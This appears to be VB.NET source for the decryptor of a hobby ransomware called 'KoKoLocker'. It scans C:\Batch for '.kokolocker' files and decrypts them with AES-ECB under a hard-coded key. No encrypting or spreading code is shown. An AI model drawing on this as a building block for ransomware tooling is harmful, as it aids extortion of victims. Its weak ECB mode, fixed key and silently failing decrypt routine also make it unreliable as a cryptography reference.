Public Class dc

    Private Sub dc_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Decrypt()
    End Sub
    Private Sub Decrypt()
        Dim mExtensions As IEnumerable(Of String) = {".kokolocker"}
        Dim route As String = "C:\Batch"
        For Each mArchives As String In searchArchives(route, mExtensions)
            fname.Text = mArchives.ToString
            Try
                CryptoRansomwareDecyrption(mArchives, "KoKoKrypterV1.0")
            Catch ex As Exception
                Continue For
            End Try
        Next
    End Sub
    Private Function AESD(ByVal input As Byte(), ByVal key As String) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim SHA256 As New System.Security.Cryptography.SHA256Cng
        Try
            AES.Key = SHA256.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(key))
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function
    Public Function CryptoRansomwareDecyrption(ByVal file As String, ByVal key As String)
        If My.Computer.FileSystem.FileExists(file) Then
            Dim fil As String = System.IO.Path.GetFileName(file)
            My.Computer.FileSystem.WriteAllBytes(file, AESD(My.Computer.FileSystem.ReadAllBytes(file), key), False)
            fil = fil.Replace(".kokolocker", "").Trim()
            My.Computer.FileSystem.RenameFile(file, fil)
        End If
    End Function
    Public Shared Function searchArchives(ByVal route As String, ByVal mExtensions As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From mArchives In IO.Directory.GetFiles(route, "*", IO.SearchOption.AllDirectories) Where mExtensions.Contains(IO.Path.GetExtension(mArchives).ToLower())).ToList()
    End Function
End Class